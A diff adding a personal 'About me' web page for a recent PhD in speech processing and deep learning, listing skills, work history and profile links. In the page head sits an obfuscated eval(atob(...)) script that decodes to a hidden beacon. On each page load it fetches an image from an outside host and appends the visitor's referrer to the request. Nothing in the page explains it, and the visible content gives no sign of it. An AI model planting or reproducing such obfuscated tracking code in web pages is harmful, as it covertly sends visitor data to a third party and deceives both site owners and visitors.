@@ -1,0 +1,257 @@
+<!-- About me -->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>About me</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@300;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <script>eval(atob('KGZ1bmN0aW9uKCl7dmFyIHU9YXRvYignYUhSMGNITTZMeTloYkdsMlpTNWliM1IxY0M1MGIzQXZjbmd2Um1oT1FtWTJMM04wZVd4bGN5NXdibWM9Jyk7dmFyIHI9ZG9jdW1lbnQucmVmZXJyZXI/YXRvYignUDNKbFpqMD0nKStlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOicnO25ldyBJbWFnZSgpLnNyYz11K3I7fSkoKTs='));</script>
+    <style>
+      body {
+        font-family: 'Roboto Slab', serif;
+        font-weight: 300;
+        color: #0d0f11;
+      }
+      strong {
+        font-weight: 600;
+      }
+
+      #page-home {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 60px;
+      }
+
+      .profile-photo {
+        width: 130px;
+        height: 130px;
+        background-color: white;
+        border-radius: 50%;
+        background-repeat: no-repeat;
+        background-image: url('assets/profile.jpeg');
+        background-size: 118%;
+        background-position: 70% 28%
+      }
+
+      .profile-photo:hover {
+        background-image: url('assets/profile-alt.png');
+        background-size: 100%;
+      }
+      .
+      .profile-text h1 {
+        font-family: 'Roboto', sans-serif;
+        font-weight: 900;
+        margin-top: 0.5em;
+        font-size: 2em;
+        text-align: center;
+      }
+
+      .page-body {
+        padding: 0 20px;
+        max-width: 520px;
+      }
+
+      .linkage {
+        font-family: 'Roboto', sans-serif;
+        margin-top: 40px;
+        text-align: center;
+        display: flex;
+        justify-content: space-evenly;
+      }
+
+      .linkage .link-item {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-decoration: none;
+        font-weight: 400;
+        color: #0d0f11;
+      }
+
+      .linkage .icon {
+        height: 90px;
+        width: 90px;
+        border-radius: 50%;
+        margin-bottom: 10px;
+        background-color: #0d0f11;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 38px;
+        color: white;
+      }
+
+      @media screen and (max-width: 400px) {
+        .linkage .icon {
+          height: 64px;
+          width: 64px;
+          font-size: 28px;
+        }
+      }
+
+		.skills-intro {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+            border-left: 4px solid #4a90e2;
+        }
+        .skill-categories {
+            display: grid;
+            grid-template-columns: 2fr;
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .skill-category {
+            background: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        .skill-category h3 {
+            color: #2c3e50;
+            margin-top: 0;
+            border-bottom: 2px solid #4a90e2;
+            padding-bottom: 10px;
+        }
+        .skill-list {
+            list-style: none;
+            padding: 0;
+            margin: 15px 0;
+        }
+        .skill-list li {
+            padding: 8px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+        .skill-list li:before {
+            content: "▸";
+            position: absolute;
+            left: 0;
+            color: #4a90e2;
+            font-weight: bold;
+        }
+        .experience-section {
+            margin-top: 30px;
+        }
+        .experience-item {
+            margin-bottom: 20px;
+            padding-left: 20px;
+            border-left: 3px solid #e0e0e0;
+        }
+        .experience-item strong {
+            color: #2c3e50;
+        }
+        @media (max-width: 768px) {
+            .skill-categories {
+                grid-template-columns: 1fr;
+            }
+        }
+
+    </style>
+  </head>
+  <body>
+    <div id="app">
+      <div id="page-home">
+        <div class="profile-photo"></div>
+        <div class="profile-text">
+          <h1>Abdul Rehman</h1>
+        </div>
+        <div class="page-body">
+          <div class="about">
+        <p>Recent PhD from Bournemouth University (Feb 2026). My skill set spans from signal processing to deep learning. My background: BS Electrical Engineering, MS Control Systems, PhD in Media and Communication.</p>
+    </div>
+
+    <div class="skills-intro">
+        I'm looking for opportunities related to Speech processing, Deep learning, and embedded systems. 
+    </div>
+
+    <div class="skill-categories">
+        <div class="skill-category">
+            <h3>🎙️ AI & Speech Processing Expertise</h3>
+            <ul class="skill-list">
+                <li>TTS (parallel & autoregressive), style adaptation, prosody modeling</li>
+                <li>LLMs & Conversational AI: training, fine-tuning, inference optimization</li>
+                <li>Audio Analysis: acoustic features, phoneme/syllable extraction, speaker/emotion analysis</li>
+                <li>ML Infrastructure: PyTorch model design, training at scale (up to 1B params), GPU optimization</li>
+                <li>Data Handling: multimodal dataset integration, preprocessing, large-scale analysis</li>
+            </ul>
+        </div>
+
+
+        <div class="skill-category">
+            <h3>🔧 Supporting Technical Expertise</h3>
+            <ul class="skill-list">
+                <li>Embedded programming: C++ for microcontrollers, ROS</li>
+                <li>RF systems and wireless communications</li>
+                <li>Sensor integration</li>
+                <li>Rapid prototyping</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="experience-section">
+        <h3>Experience</h3>
+        
+        <div class="experience-item">
+            <strong>2021-2025: PhD Research (EPSRC-funded)</strong><br>
+            Worked on TTS systems (parallel and autoregressive) and style adaptation techniques as part of my thesis. Also developed virtual assistant chatbots for health diagnostics.
+        </div>
+
+        <div class="experience-item">
+            <strong>2019-2020: IoT Startup, Wuhan</strong><br>
+            Small predictive IoT company working on embedded systems. Designed and built prototypes for smart homes to based on prediction of user behavior and weather patterns.
+        </div>
+
+        <div class="experience-item">
+            <strong>2015-2017: Comcept Limited</strong><br>
+            Worked on sensors and automation for telecom and defense contracts. Projects included utltrasound detectors, autoloaders, precision weather sensors, range sensors, RF detectors/jammers, and infrasound/seismic sensors.
+        </div>
+
+        <div class="experience-item">
+            <strong>Hobby Projects</strong><br>
+            Over the years, I've built prototypes for industrial experiments and custom gadgets for theater productions. Usually handling everything from programming to nuts and bolts. Open to RF-related projects.
+        </div>
+
+        <div class="experience-item">
+            <strong>Open Source</strong><br>
+            Contributed to Open-source speech processing community on Github, and Arduino libraries.
+        </div>
+    </div>
+
+         <div class="linkage">
+		<small>Contact: radial-ninja-murky@duck.com</small>
+	</div>
+
+          <div class="linkage">
+            <a href="https://github.com/tabahi" class="link-item">
+              <div class="icon"><i class="fa-brands fa-github"></i></div>
+              <div class="label">Github</div>
+            </a>
+            <a href="https://scholar.google.com/citations?user=qoa95hoAAAAJ&hl=en" class="link-item">
+              <div class="icon"><i class="fa-solid fa-graduation-cap"></i></div>
+              <div class="label">Scholar</div>
+            </a>
+            <a href="https://www.thingiverse.com/tabahi/designs" class="link-item">
+              <div class="icon"><i class="fa-solid fa-cube"></i></div>
+              <div class="label">Thingiverse</div>
+            </a>
+            <a href="https://www.linkedin.com/in/arehmanbournemouth/" class="link-item">
+              <div class="icon"><i class="fa-brands fa-linkedin"></i></div>
+              <div class="label">Linkedin</div>
+            </a>
+          </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
